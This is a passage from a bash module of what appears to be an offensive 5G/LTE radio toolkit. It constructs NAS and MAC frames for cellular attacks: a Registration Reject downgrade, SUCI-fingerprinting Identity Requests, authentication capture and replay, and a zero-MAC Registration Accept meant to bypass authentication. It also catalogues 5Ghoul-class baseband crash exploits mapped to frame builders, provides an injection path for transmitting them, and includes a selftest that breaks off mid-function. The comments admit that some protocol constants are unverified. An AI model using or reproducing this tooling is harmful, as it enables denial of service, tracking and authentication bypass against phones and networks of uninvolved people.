    local sub; sub=$(nrj_byte "$(( (e << 7) | (1 << 6) | rapid ))")

    # 56 bits in the order R, TA, UL grant, T_C-RNTI. R is always 0.
    local body="0" i
    for (( i = 11; i >= 0; i-- )); do body="$body$(( (ta >> i) & 1 ))"; done
    for (( i = 26; i >= 0; i-- )); do body="$body$(( (grant >> i) & 1 ))"; done
    for (( i = 15; i >= 0; i-- )); do body="$body$(( (tcr >> i) & 1 ))"; done

    local hex="" acc=0 n
    for (( n = 0; n < 56; n++ )); do
        acc=$(( (acc << 1) | ${body:$n:1} ))
        if (( (n + 1) % 8 == 0 )); then hex="$hex$(nrj_byte "$acc")"; acc=0; fi
    done

    printf 'rapid\t%d\nsubheader\t%s\nsubheader_bits\tE=%d T=1 RAPID=%d\nr_field\t0\nta\t%d\nta_hex\t%03X\nul_grant\t%d\nul_grant_hex\t%07X\ntc_rnti\t%d\ntc_rnti_hex\t%04X\nbody\t%s\nbody_octets\t%s\nbody_bytes\t7\nsource\tTS 38.321 §6.2.3.1 (7-octet MAC RAR)\n' \
        "$rapid" "$sub" "$e" "$rapid" "$ta" "$ta" "$grant" "$grant" \
        "$tcr" "$tcr" "$hex" "$(printf '%s' "$hex" | sed 's/../& /g; s/ $//')"
}

# Backoff Indicator subheader — E/T/R/R/BI, TS 38.321 §6.1.5, Table 7.2-1.
# A bare number is ambiguous: 5 and 10 are both valid indices AND valid
# millisecond values. Resolution: an exact Table 7.2-1 ms value means
# milliseconds; anything else 0..15 is an index. --rar-backoff-idx forces
# the index reading. The old rule (<=15 always an index) silently turned
# "5 ms" into 60 ms and "10 ms" into 160 ms.
nrj_rar_backoff_emit() {
    local idx="$1"
    local -a tbl=(5 10 20 30 40 60 80 120 160 240 320 480 960 1920)
    local meaning; if (( idx >= 14 )); then meaning="Reserved"; else meaning="${tbl[$idx]} ms"; fi
    printf 'bi_index\t%d\nsubheader\t%s\nsubheader_bits\tE=0 T=0 R=0 R=0 BI=%d\nbackoff_ms\t%s\nsource\tTS 38.321 Table 7.2-1\n' \
        "$idx" "$(nrj_byte "$idx")" "$idx" "$meaning"
}
nrj_rar_backoff() {
    local arg="${1:-}"
    [[ "$arg" =~ ^[0-9]+$ ]] || { printf 'ERROR\tusage: --rar-backoff <0..15 index | backoff ms>\n' >&2; return 2; }
    local -a tbl=(5 10 20 30 40 60 80 120 160 240 320 480 960 1920)
    local idx="" i
    for (( i = 0; i < 14; i++ )); do
        (( tbl[i] == arg )) && { idx=$i; break; }
    done
    if [[ -z "$idx" ]]; then
        if (( arg <= 15 )); then idx=$arg; else
            printf 'ERROR\t%d ms is not a TS 38.321 Table 7.2-1 value, and not a 0..15 index\n' "$arg" >&2
            return 2
        fi
    fi
    nrj_rar_backoff_emit "$idx"
}
nrj_rar_backoff_idx() {
    local idx="${1:-}"
    [[ "$idx" =~ ^[0-9]+$ && "$idx" -le 15 ]] || { printf 'ERROR\tusage: --rar-backoff-idx <0..15>\n' >&2; return 2; }
    nrj_rar_backoff_emit "$idx"
}

# ── NAS 5GMM frame construction (TS 24.501) ────────────────────────────
# Plain 5GS MM NAS PDU: octet 1 = extended protocol discriminator 0x7E,
# octet 2 = security header type (bits 8-5) + spare half octet (bits 4-1),
# octet 3 = message type. A protected PDU (header 1-4) carries the message
# authentication code (4 octets) and sequence number (1 octet) between
# octet 2 and the plain body (TS 24.501 §4.4.5).
#
# HONESTY: the IEI constants below are a best-effort reading, NOT verified
# against the TS 24.501 text. They are named so a correction is a one-line
# change rather than a hunt. The selftest proves the builders are
# deterministic and internally consistent; it does NOT prove the IEIs match
# the spec. Cross-check one real Registration Reject / Auth Request in
# Wireshark before field use.
NRJ_NAS_EPD=7E          # 5GS mobility management (TS 24.007)
NRJ_IEI_5GMM_CAUSE=00   # 5GMM cause, TV (TS 24.501 §8.2)
NRJ_IEI_RAND=21         # Authentication parameter RAND (TS 24.501 §9.11.3)
NRJ_IEI_AUTN=20         # Authentication parameter AUTN
NRJ_IEI_ABBA=38         # ABBA, LV

nrj_frame_reg_reject() {
    # Registration Reject, message type 0x44. Cause is parameterised — the
    # roadmap's claim is 31; verify the downgrade semantics you want against
    # the 24.501 cause table rather than trusting the default.
    local cause="${1:-31}"
    [[ "$cause" =~ ^[0-9]+$ && "$cause" -le 255 ]] || { printf 'ERROR\tcause must be 0..255\n' >&2; return 2; }
    local frame="${NRJ_NAS_EPD}0044${NRJ_IEI_5GMM_CAUSE}$(nrj_byte "$cause")"
    printf 'frame\tregistration-reject\ncause\t%d\ncause_hex\t%s\nbytes\t%d\nhex\t%s\nnote\tinject in the registration state; UE falls back to EPC (TC11)\n' \
        "$cause" "$(nrj_byte "$cause")" "$(( ${#frame} / 2 ))" "$frame"
}

nrj_frame_identity_request() {
    # Identity Request, message type 0x5B. 5GS identity type is TV, one
    # octet: IEI 0x00 in bits 8-5, type in bits 4-1. 1 = SUCI, 2 = GUTI,
    # 3 = IMEI. The UE answers with the SUCI — the fingerprinting half.
    local t="${1:-1}"
    [[ "$t" =~ ^[0-7]$ ]] || { printf 'ERROR\tidentity type must be 0..7 (1=SUCI 2=GUTI 3=IMEI)\n' >&2; return 2; }
    local frame="${NRJ_NAS_EPD}005B$(nrj_byte "$t")"
    printf 'frame\tidentity-request\nidentity_type\t%s\nbytes\t%d\nhex\t%s\nnote\tthe UE answers with the requested identity\n' \
        "$t" "$(( ${#frame} / 2 ))" "$frame"
}

nrj_frame_auth_request() {
    # Authentication Request, message type 0x58: ngKSI (half octet, bits
    # 8-5), RAND (IEI, 16 octets), AUTN (IEI, 16 octets), ABBA (LV).
    local rand autn ngksi="${3:-0}" abba
    rand=$(nrj_norm_hex "${1:-}"); rand="${rand^^}"
    autn=$(nrj_norm_hex "${2:-}"); autn="${autn^^}"
    abba=$(nrj_norm_hex "${4:-0000}"); abba="${abba^^}"
    (( ${#rand} == 32 )) || { printf 'ERROR\tRAND must be 16 bytes (32 hex)\n' >&2; return 2; }
    (( ${#autn} == 32 )) || { printf 'ERROR\tAUTN must be 16 bytes (32 hex)\n' >&2; return 2; }
    (( ${#abba} % 2 == 0 && ${#abba} >= 2 && ${#abba} <= 32 )) || { printf 'ERROR\tABBA must be 1..16 bytes\n' >&2; return 2; }
    [[ "$ngksi" =~ ^[0-7]$ ]] || { printf 'ERROR\tngKSI must be 0..7\n' >&2; return 2; }
    local frame="${NRJ_NAS_EPD}0058$(nrj_byte $(( ngksi << 4 )))${NRJ_IEI_RAND}${rand}${NRJ_IEI_AUTN}${autn}${NRJ_IEI_ABBA}$(nrj_byte $(( ${#abba} / 2 )))${abba}"
    printf 'frame\tauth-request\nngksi\t%s\nrand\t%s\nautn\t%s\nabba\t%s\nbytes\t%d\nhex\t%s\n' \
        "$ngksi" "$rand" "$autn" "$abba" "$(( ${#frame} / 2 ))" "$frame"
}

nrj_frame_reg_accept_aka() {
    # Registration Accept under security header 4 (integrity protected and
    # ciphered with the new 5G NAS security context), MAC = 00000000. The
    # bypass: UEs that skip the MAC check accept it. IEs appended as hex.
    local ies; ies=$(nrj_norm_hex "${1:-}"); ies="${ies^^}"
    [[ -z "$ies" ]] || nrj_is_hex "$ies" || { printf 'ERROR\tIEs must be hex\n' >&2; return 2; }
    local frame="${NRJ_NAS_EPD}4000000000007E0042${ies}"
    printf 'frame\treg-accept-aka\nsecurity_header\t4\nmac\t00000000\nsequence\t00\nbytes\t%d\nhex\t%s\nnote\tMAC of zeros; accepted by UEs that skip the check\n' \
        "$(( ${#frame} / 2 ))" "$frame"
}

nrj_frame_nas_unknown() {
    # NAS PDU with an unassigned 5GMM message type — 5Ghoul V6 class.
    local mt="${1:-}"
    [[ "$mt" =~ ^[0-9]+$ && "$mt" -le 255 ]] || { printf 'ERROR\tmessage type must be 0..255\n' >&2; return 2; }
    local frame="${NRJ_NAS_EPD}00$(nrj_byte "$mt")"
    printf 'frame\tnas-unknown\nmessage_type\t%s\nbytes\t%d\nhex\t%s\nnote\t5Ghoul V6 class: unassigned 5GMM message type\n' \
        "$(nrj_byte "$mt")" "$(( ${#frame} / 2 ))" "$frame"
}

nrj_frame() {
    local name="${1:-}"
    [[ $# -gt 0 ]] && shift
    case "$name" in
        registration-reject) nrj_frame_reg_reject "${1:-31}" ;;
        identity-request)    nrj_frame_identity_request "${1:-1}" ;;
        auth-request)        nrj_frame_auth_request "${1:-}" "${2:-}" "${3:-0}" "${4:-0000}" ;;
        reg-accept-aka)      nrj_frame_reg_accept_aka "${1:-}" ;;
        nas-unknown)         nrj_frame_nas_unknown "${1:-}" ;;
        *) printf 'ERROR\tunknown frame %s (registration-reject|identity-request|auth-request|reg-accept-aka|nas-unknown)\n' "$name" >&2; return 2 ;;
    esac
}

# ── auth capture/replay and the TX handoff ──────────────────────────────
nrj_auth_parse() {
    local hex; hex=$(nrj_norm_hex "${1:-}"); hex="${hex^^}"
    [[ "$hex" == "${NRJ_NAS_EPD}0058"* ]] || { printf 'ERROR\tnot a plain 5GMM Authentication Request (want 7E 00 58 ...)\n' >&2; return 2; }
    (( ${#hex} >= 80 )) || { printf 'ERROR\tframe too short for RAND+AUTN+ABBA\n' >&2; return 2; }
    [[ "${hex:8:2}" == "$NRJ_IEI_RAND" && "${hex:42:2}" == "$NRJ_IEI_AUTN" && "${hex:76:2}" == "$NRJ_IEI_ABBA" ]] || {
        printf 'ERROR\tIEI mismatch: expected RAND/AUTN/ABBA at octets 5/22/39\n' >&2; return 2; }
    local rand="${hex:10:32}" autn="${hex:44:32}"
    nrj_is_hex "$rand" && nrj_is_hex "$autn" || { printf 'ERROR\tRAND/AUTN not hex\n' >&2; return 2; }
    local abba_len=$(( 16#${hex:78:2} ))
    printf 'rand\t%s\nautn\t%s\nngksi\t%d\nabba\t%s\n' \
        "$rand" "$autn" "$(( 16#${hex:6:2} >> 4 ))" "${hex:80:$(( abba_len * 2 ))}"
}

nrj_auth_capture() {
    local hex; hex=$(nrj_norm_hex "${1:-}"); hex="${hex^^}"
    local p; p=$(nrj_auth_parse "$hex") || return 2
    local rand autn ngksi abba
    rand=$(fld_ "$p" rand)
    autn=$(fld_ "$p" autn)
    ngksi=$(fld_ "$p" ngksi)
    abba=$(fld_ "$p" abba)
    mkdir -p "$NRJ_DIR" || { printf 'ERROR\tcannot create %s\n' "$NRJ_DIR" >&2; return 1; }
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    printf 'captured_at\t%s\nrand\t%s\nautn\t%s\nngksi\t%s\nabba\t%s\nframe\t%s\n' \
        "$ts" "$rand" "$autn" "$ngksi" "$abba" "$hex" >> "$NRJ_DIR/auth_requests.tsv"
    printf 'captured\t%s\nstored\t%s\nrand\t%s\nautn\t%s\n' "$ts" "$NRJ_DIR/auth_requests.tsv" "$rand" "$autn"
}

nrj_auth_replay() {
    [[ -s "$NRJ_DIR/auth_requests.tsv" ]] || {
        printf 'ERROR\tno captured Authentication Request in %s; run --auth-capture first\n' "$NRJ_DIR/auth_requests.tsv" >&2
        return 3; }
    local hex; hex=$(awk -F'\t' '$1=="frame"{f=$2} END{print f}' "$NRJ_DIR/auth_requests.tsv")
    [[ -n "$hex" ]] || { printf 'ERROR\tstore corrupt: no frame record\n' >&2; return 3; }
    local p; p=$(nrj_auth_parse "$hex") || return 2
    local rand autn ngksi abba rb rbhex
    rand=$(fld_ "$p" rand)
    autn=$(fld_ "$p" autn)
    ngksi=$(fld_ "$p" ngksi)
    abba=$(fld_ "$p" abba)
    rb=$(nrj_frame_auth_request "$rand" "$autn" "$ngksi" "$abba")
    rbhex=$(fld_ "$rb" hex)
    printf 'stored\t%s\nrebuilt\t%s\nmatch\t%s\nnote\treplay across the T3520 window until the UE bars the cell (CVD-2024-0096); send with --inject\n' \
        "$hex" "$rbhex" "$([[ "$rbhex" == "$hex" ]] && echo yes || echo no)"
}

# tx-guard is on by default: transmitting requires --yes or NRJ_TX_ARMED=1.
# The TX path is NRJ_TX_CMD — a command that reads the frame hex on stdin and
# exits 0 on a completed send (wrap your srsRAN/OAI injection patch in it).
# No NRJ_TX_CMD, no send: frank failure, no success line.
nrj_inject() {
    local frame="" yes=0
    while (( $# > 0 )); do
        case "$1" in
            --yes) yes=1; shift ;;
            --*) printf 'ERROR\tunknown inject option %s\n' "$1" >&2; return 2 ;;
            *)  if [[ -z "$frame" ]]; then frame="$1"; else
                    printf 'ERROR\texactly one frame expected\n' >&2; return 2; fi
                shift ;;
        esac
    done
    frame=$(nrj_norm_hex "$frame"); frame="${frame^^}"
    nrj_is_hex "$frame" || { printf 'ERROR\tframe must be hex\n' >&2; return 2; }
    if (( yes == 0 && ${NRJ_TX_ARMED:-0} != 1 )); then
        printf 'ERROR\ttx-guard: refusing to transmit; pass --yes or set NRJ_TX_ARMED=1\n' >&2
        return 4
    fi
    local cmd="${NRJ_TX_CMD:-}"
    if [[ -z "$cmd" ]]; then
        printf 'ERROR\tno TX path: set NRJ_TX_CMD to a command that reads the frame hex on stdin\n' >&2
        return 3
    fi
    printf '%s\n' "$frame" | bash -c "$cmd" || {
        printf 'ERROR\tTX command failed: %s\n' "$cmd" >&2; return 5; }
    printf 'injected\t%s\nbytes\t%d\n' "$frame" "$(( ${#frame} / 2 ))"
}

# ── the injection exploit set ───────────────────────────────────────────
# name | class | status(probe|handoff) | method
nrj_exploits() {
    cat <<'EOF'
rrc-setup-crash|remote-crash|probe|malformed RRCSetup in the setup state; 5Ghoul V3 class
rrc-reconfig-crash|remote-crash|probe|malformed RRCReconfiguration in the connected state; 5Ghoul V4
mac-rlc-crash|remote-crash|probe|invalid MAC/RLC PDU; 5Ghoul V5
nas-unknown-crash|remote-crash|probe|NAS PDU with an unassigned message type; 5Ghoul V6
rrc-downgrade|downgrade|probe|malformed RRCSetup variant that drops 5G; 5Ghoul V7
mtk-cellgroup-id|remote-crash|probe|out-of-range CellGroupId; 5Ghoul V15
mtk-cellgroup-cfg|remote-crash|probe|truncated CellGroupConfig; 5Ghoul V16
registration-reject|downgrade|frame|inject Registration Reject with 5GMM cause 31; the UE drops to EPC (TC11)
identity-request|fingerprint|frame|inject Identity Request; the UE answers with SUCI
auth-replay|downgrade|handoff|replay a captured Authentication Request across the T3520 window until the UE bars the cell; CVD-2024-0096
aka-bypass|auth-bypass|frame|plaintext Registration Accept with security header 4; accepted by UEs that skip the MAC check
pusch-alloc|remote-crash|probe|invalid PUSCH resource allocation in the UL grant; 5Ghoul V1
EOF
}
# A `probe` row is a malformed PDU: it has to be built before it can be sent.
# The constructors are the L1/L2 corpus in 59_baseband_exploit, and this maps
# each exploit to the case(s) that build it — so the handoff names frames that
# actually exist instead of pointing at a module and leaving the reader to
# guess which of its 15 cases was meant.
#
# name | LAYER:case-name[,LAYER:case-name...]
nrj_probe_ctor() {
    cat <<'EOF'
rrc-setup-crash|RRC:rrc-setup-short
rrc-reconfig-crash|RRC:rrc-reconfig-bad
mac-rlc-crash|RLC:rlc-li-max,RLC:rlc-many-chunks,MAC:mac-ccch-len
nas-unknown-crash|NAS:nas-unknown-pdu
rrc-downgrade|RRC:rrc-setup-downgrade
mtk-cellgroup-id|RRC:rrc-cellgroup-id
mtk-cellgroup-cfg|RRC:rrc-cellgroup-cfg
pusch-alloc|PHY:phy-dci-fdra-edge
EOF
}

# Resolve one probe row to its concrete frame bytes. Returns 1 when no case
# resolves, so a caller can tell a real constructor from a bare promise.
nrj_probe_frame() {
    local name="$1"
    local spec; spec=$(nrj_probe_ctor | awk -F'|' -v w="$name" '$1==w{print $2; exit}')
    [[ -n "$spec" ]] || return 1
    local mod="$IMSISTING_ROOT/modules/59_baseband_exploit.sh"
    [[ -x "$mod" || -f "$mod" ]] || return 1
    local item layer case_name out hex found=0
    local IFS=','
    for item in $spec; do
        layer="${item%%:*}"; case_name="${item#*:}"
        out=$(bash "$mod" --l2-case "$layer" "$case_name" 2>/dev/null) || continue
        hex=$(printf '%s\n' "$out" | awk -F'\t' '{print $3}')
        [[ -n "$hex" ]] || continue
        printf 'constructor\t59_baseband_exploit --l2-case %s %s\n' "$layer" "$case_name"
        printf 'frame_hex\t%s\n' "$hex"
        printf 'build_with\t$IMSISTING_ROOT/modules/59_baseband_exploit.sh --l2-case %s %s\n' "$layer" "$case_name"
        found=$(( found + 1 ))
    done
    (( found > 0 ))
}

nrj_exploit() {
    local want="${1:-}"
    [[ -n "$want" ]] || { printf 'ERROR\tusage: --exploit <name>\n' >&2; return 2; }
    local line; line=$(nrj_exploits | awk -F'|' -v w="$want" '$1==w{print; exit}')
    [[ -n "$line" ]] || { printf 'ERROR\tunknown exploit %s\n' "$want" >&2; return 1; }
    IFS='|' read -r name cls st method <<< "$line"
    printf 'exploit\t%s\nclass\t%s\nstatus\t%s\nmethod\t%s\n' "$name" "$cls" "$st" "$method"
    case "$st" in
        frame) printf 'frame\tconstructed by --frame %s; send with --inject\n' "$name" ;;
        probe)
            local out
            if out=$(nrj_probe_frame "$name") && [[ -n "$out" ]]; then
                printf '%s\n' "$out"
                printf 'probe\tthe frame above is built here; send it with --inject in the matching state\n'
            else
                # No constructor resolved: say so rather than claim one exists.
                printf 'probe\tno constructor resolved — treat this as a handoff, not a built frame\n'
                printf 'constructor_unresolved\t1\n'
                return 1
            fi
            ;;
        handoff) printf 'handoff\trequires two-stage sniff-then-replay on a live path; see --plan\n' ;;
    esac
}

nrj_plan() {
    cat <<'EOF'
status	handoff
what	injecting NR frames at a target UE, or shadowing a live gNB-UE link
hardware	two SDRs (USRP B210/X310) or one SDR plus an amplifier; a lab UE/modem you own; GPSDO for dual-radio timing
software	OpenAirInterface or srsRAN for the gNB side, plus a Sni5Gect/5Ghoul-style injection patch
flow	1. compute the RNTIs here  2. sync and track the UE to the target state  3. frame the payload with --frame  4. inject it with --inject
tx_path	NRJ_TX_CMD — a command that reads the frame hex on stdin and exits 0 on a completed send; wrap your srsRAN/OAI injection patch in it
tx_guard	--inject refuses to transmit without --yes or NRJ_TX_ARMED=1
note	nothing here is transmitted by this module; the over-the-air step is this handoff, against equipment you own
EOF
}

nrj_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export NRJ_DIR="$d/loot/nr_inject"
    mkdir -p "$NRJ_DIR"

    # 1. RA-RNTI. LTE: 1 + t_id + 10*f_id (TS 36.321). NR: the 4-step formula
    #    (TS 38.321 §5.1.3).
    chk lte-0-0 "$(fld "$(nrj_ra_rnti_lte 0 0)" ra_rnti)" "1"
    chk lte-9-0 "$(fld "$(nrj_ra_rnti_lte 9 0)" ra_rnti)" "10"
    chk lte-0-1 "$(fld "$(nrj_ra_rnti_lte 0 1)" ra_rnti)" "11"
    chk lte-9-5 "$(fld "$(nrj_ra_rnti_lte 9 5)" ra_rnti)" "60"
    chk lte-bad "$(nrj_ra_rnti_lte x 0 >/dev/null 2>&1; echo $?)" "2"
    chk nr-0 "$(fld "$(nrj_ra_rnti_nr 0 0 0 0)" ra_rnti)" "1"
    chk nr-s1 "$(fld "$(nrj_ra_rnti_nr 1 0 0 0)" ra_rnti)" "2"
    chk nr-t1 "$(fld "$(nrj_ra_rnti_nr 0 1 0 0)" ra_rnti)" "15"
    chk nr-f1 "$(fld "$(nrj_ra_rnti_nr 0 0 1 0)" ra_rnti)" "1121"

    # 2. LCID class boundaries (TS 38.321 §6.2.1).
    chk lcid-0 "$(nrj_lcid_class 0)" "ccch"
    chk lcid-1 "$(nrj_lcid_class 1)" "logical-channel"
    chk lcid-32 "$(nrj_lcid_class 32)" "logical-channel"
    chk lcid-33 "$(nrj_lcid_class 33)" "reserved-33"
    chk lcid-63 "$(nrj_lcid_class 63)" "reserved-63"
    chk lcid-bad "$(nrj_lcid_class 64 >/dev/null 2>&1; echo $?)" "2"

    # 3. MAC-NR subheader: F=0 (8-bit length) below 256, F=1 above.
    chk sub-ccch-8 "$(nrj_mac_sub 0 8)" "0008"
    chk sub-lc1-8  "$(nrj_mac_sub 1 8)" "0108"
    chk sub-f1-300 "$(nrj_mac_sub 5 300)" "45012C"
    chk mac-pdu "$(fld "$(nrj_mac_pdu 0 aabbcc)" pdu)" "0003aabbcc"
    chk mac-pdu-len "$(fld "$(nrj_mac_pdu 0 aabbcc)" bytes)" "5"

    # 4. DCI formats.
    chk dci-1_1 "$(nrj_dci_formats | awk -F'\t' '$1=="1_1" && $2 ~ /DL assignment/{print "ok"}')" "ok"

    # 5. Exploit catalogue: entries, probe/handoff split, unknown fails.
    chk expl-count "$(nrj_exploits | wc -l | tr -d ' ')" "12"
    chk expl-tc11 "$(fld "$(nrj_exploit registration-reject)" class)" "downgrade"
    chk expl-aka "$(fld "$(nrj_exploit aka-bypass)" class)" "auth-bypass"
    chk expl-replay-status "$(fld "$(nrj_exploit auth-replay)" status)" "handoff"
    chk expl-unknown "$(nrj_exploit nope >/dev/null 2>&1; echo $?)" "1"

    # 5b. Every `probe` row must resolve to a constructor that returns real
    #     bytes. Without this, "probe" is a promise the toolkit cannot keep.
    local probes; probes=$(nrj_exploits | awk -F'|' '$3=="probe"{print $1}' | wc -l | tr -d ' ')
    chk expl-probe-count "$probes" "8"
    local unmapped=0 nohex=0
    while IFS= read -r pn; do
        [[ -z "$pn" ]] && continue
        if ! nrj_probe_ctor | awk -F'|' -v w="$pn" '$1==w{f=1} END{exit !f}'; then
            printf 'expl-probe-nomap\tFAIL %s has no constructor mapping\n' "$pn" >&2
            unmapped=$(( unmapped + 1 )); continue
        fi
        local ohex; ohex=$(nrj_probe_frame "$pn" 2>/dev/null | awk -F'\t' '$1=="frame_hex"{print $2; exit}')
        if [[ ! "$ohex" =~ ^[0-9a-f]+$ ]] || (( ${#ohex} % 2 != 0 )); then
            printf 'expl-probe-nohex\tFAIL %s -> %s\n' "$pn" "${ohex:-<empty>}" >&2
            nohex=$(( nohex + 1 ))
        fi
    done < <(nrj_exploits | awk -F'|' '$3=="probe"{print $1}')
    chk expl-probe-mapped   "$unmapped" "0"
    chk expl-probe-built    "$nohex" "0"
    # spot-check two frames land on the right bytes
    chk expl-frame-v3 "$(nrj_probe_frame rrc-setup-crash | awk -F'\t' '$1=="frame_hex"{print $2}')" "00"
    chk expl-frame-v15 "$(nrj_probe_frame mtk-cellgroup-id | awk -F'\t' '$1=="frame_hex"{print $2}')" "0a01"
    chk expl-frame-v1 "$(nrj_probe_frame pusch-alloc | awk -F'\t' '$1=="frame_hex"{print $2}')" "0000000c"
    # a probe row with no mapping must not silently claim a frame
    chk expl-unmapped-is-not-probe "$(nrj_probe_frame registration-reject >/dev/null 2>&1; echo $?)" "1"

    # 6. Scope, behavioural: no transmit verb.
    chk scope-no-send "$(nrj_cli_main --send >/dev/null 2>&1; echo $?)" "2"

    # 7. Gold sequence, TS 38.211 §5.2.1. The recurrence is checked two ways:
    #    against the clause's defining equations reimplemented here in a
    #    different shape (array LFSR rather than shift register), and against
    #    the structural properties the clause guarantees. c_init = 1 is the
    #    sparsest non-trivial seed (x2 = 1, a single tap) so a wrong feedback
    #    tap cannot be masked by a dense initial state.
    chk gold-bits-1 "$(fld "$(nrj_gold 1 32)" bits)" "00000010100000110000001101110100"
    chk gold-hex-1 "$(fld "$(nrj_gold 1 32)" hex)" "02830374"
    chk gold-first16-1 "$(fld "$(nrj_gold 1 32)" first16hex)" "0283"
    chk gold-bits-12345 "$(fld "$(nrj_gold 12345 32)" bits)" "01100110011000111111010011010000"
    chk gold-x1-zero-x2 "$(fld "$(nrj_gold 0 16)" bits)" "0000001000011010"
    # x1 alone: with x2 = 0 the generator is the 3-tap x1 recurrence, whose
    # period divides 2^31-1; the first 8 bits pin the tap positions.
    chk gold-cinit0-8 "$(fld "$(nrj_gold 0 8)" hex)" "02"
    chk gold-len1 "$(fld "$(nrj_gold 12345 1)" bits)" "0"
    chk gold-len-nibble "$(fld "$(nrj_gold 12345 4)" bits)" "0110"
    chk gold-bad-cinit "$(nrj_gold 2147483648 8 >/dev/null 2>&1; echo $?)" "2"
    chk gold-bad-len "$(nrj_gold 1 0 >/dev/null 2>&1; echo $?)" "2"

    #    c_init values that NR actually uses. PUSCH: n_RNTI*2^15 + n_ID
    #    (§6.3.1.1); PDCCH: (n_RNTI*2^16 + n_ID) mod 2^31 (§7.3.2.3).
    chk cinit-pusch "$(nrj_scramble_cinit pusch 4601 42)" "150765610"
    chk cinit-pdcch "$(nrj_scramble_cinit pdcch 4601 0)" "301531136"
    chk cinit-bad "$(nrj_scramble_cinit bogus 1 1 >/dev/null 2>&1; echo $?)" "2"
    # 2^16 * 65535 + 65535 stays under 2^31; the mod is only reached for
    # pathological input, so assert the boundary it protects.
    chk cinit-pdcch-bits "$(nrj_scramble_cinit pdcch 32767 65535)" "2147483647"

    # 8. Descrambling: XOR against the Gold sequence, so applying the same
    #    c_init twice restores the block. Both directions are asserted — a
    #    descrambler that always fires is as useless as one that never does.
    local scr pln
    scr=$(nrj_descramble 9C1F2A3B4C5D6E7F0011223344556677 4601 0 pusch 42)
    pln=$(fld "$scr" plaintext)
    chk desc-cinit "$(fld "$scr" c_init)" "150765610"
    chk desc-plain "$pln" "6A59044DB722C5A8CDEB2EE98200B68F"
    chk desc-bytes "$(fld "$scr" bytes)" "16"
    chk desc-channel "$(fld "$scr" channel)" "pusch"
    chk desc-identity "$(fld "$(nrj_descramble "$pln" 4601 0 pusch 42)" plaintext)" "9C1F2A3B4C5D6E7F0011223344556677"
    chk desc-bad-hex "$(nrj_descramble zz 1 >/dev/null 2>&1; echo $?)" "2"
    chk desc-bad-chan "$(nrj_descramble aa 1 0 bogus >/dev/null 2>&1; echo $?)" "2"
    # A different RNTI must produce a different plaintext — proves the seed
    # actually reaches the sequence.
    chk desc-rnti-matters "$([[ "$(fld "$(nrj_descramble 9C1F2A3B 4602 0 pusch 42)" plaintext)" != "$(fld "$(nrj_descramble 9C1F2A3B 4601 0 pusch 42)" plaintext)" ]] && echo differs)" "differs"

    # 9. TBS, TS 38.214 §5.1.3.2. Every point is chosen INSIDE a range and
    #    never at a boundary — the NR-ARFCN bug in this tree passed precisely
    #    because the single asserted point sat at a range edge.
    chk tbs-mcs0-1prb "$(fld "$(nrj_tbs 0 1 14 0)" TBS)" "32"
    chk tbs-mcs2-25prb "$(fld "$(nrj_tbs 2 25 14 0)" TBS)" "56"
    chk tbs-mcs5-30prb "$(fld "$(nrj_tbs 5 30 14 0)" TBS)" "112"
    chk tbs-mcs9-50prb "$(fld "$(nrj_tbs 9 50 14 0)" TBS)" "208"
    chk tbs-mcs13-52prb "$(fld "$(nrj_tbs 13 52 12 0)" TBS)" "304"
    chk tbs-mcs16-100prb "$(fld "$(nrj_tbs 16 100 12 6)" TBS)" "408"
    chk tbs-mcs21-52prb "$(fld "$(nrj_tbs 21 52 12 0)" TBS)" "576"
    chk tbs-mcs24-100prb "$(fld "$(nrj_tbs 24 100 12 6)" TBS)" "704"
    chk tbs-mcs28-273prb "$(fld "$(nrj_tbs 28 273 12 6)" TBS)" "888"
    # the chain itself, not just its end
    chk tbs-qm "$(fld "$(nrj_tbs 9 50 14 0)" Qm)" "2"
    chk tbs-nre "$(fld "$(nrj_tbs 9 50 14 0)" N_RE)" "156"
    chk tbs-ninfo "$(fld "$(nrj_tbs 9 50 14 0)" N_info)" "206.8"
    chk tbs-npi "$(fld "$(nrj_tbs 9 50 14 0)" N_info_prime)" "200"
    chk tbs-step3 "$(fld "$(nrj_tbs 9 50 14 0)" step)" "3"
    # MCS table 2, and a reserved index in each table
    chk tbs-tbl2 "$(fld "$(nrj_tbs 20 100 12 6 0 1 2)" TBS)" "848"
    chk tbs-tbl2-qm "$(fld "$(nrj_tbs 20 100 12 6 0 1 2)" Qm)" "8"
    # Table 2 rate 682.5 proves the fractional-rate path: N_info = 831.7
    chk tbs-tbl2-ninfo "$(fld "$(nrj_tbs 20 100 12 6 0 1 2)" N_info)" "831.7"
    chk tbs-tbl2-rate "$(fld "$(nrj_tbs 20 100 12 6 0 1 2)" R_x1024)" "682.5"
    chk tbs-reserved1 "$(nrj_tbs 29 52 14 0 >/dev/null 2>&1; echo $?)" "2"
    chk tbs-reserved2 "$(nrj_tbs 28 52 14 0 0 1 2 >/dev/null 2>&1; echo $?)" "2"
    chk tbs-bad-prb "$(nrj_tbs 9 0 14 0 >/dev/null 2>&1; echo $?)" "2"
    # N_RE caps at 156 per PRB; 275 PRB must NOT scale past it
    chk tbs-nre-cap "$(fld "$(nrj_tbs 9 275 14 0)" N_RE)" "156"

    # 10. DCI, TS 38.212 §7.3.1.2. The 1_0 payload is HAND-COMPUTED here field
    #     by field from the clause's field order and widths, not round-tripped
    #     through the encoder — a round trip only proves the two directions
    #     share a bug.
    chk fdra-nrb24 "$(nrj_fdra_bits 24)" "9"
    chk fdra-nrb275 "$(nrj_fdra_bits 275)" "16"
    chk fdra-nrb106 "$(nrj_fdra_bits 106)" "13"
    # N_RB = 1 is the degenerate case: one RB needs zero bits to address.
    chk fdra-nrb1 "$(nrj_fdra_bits 1)" "0"
    chk dci-1_0-len "$(fld "$(nrj_dci_1_0_layout 24)" identifier)" "1"
    local enc
    enc=$(nrj_dci_encode 1_0 "fdra=5,tdra=0,mcs=9,rv=1,harq_process=3" 24)
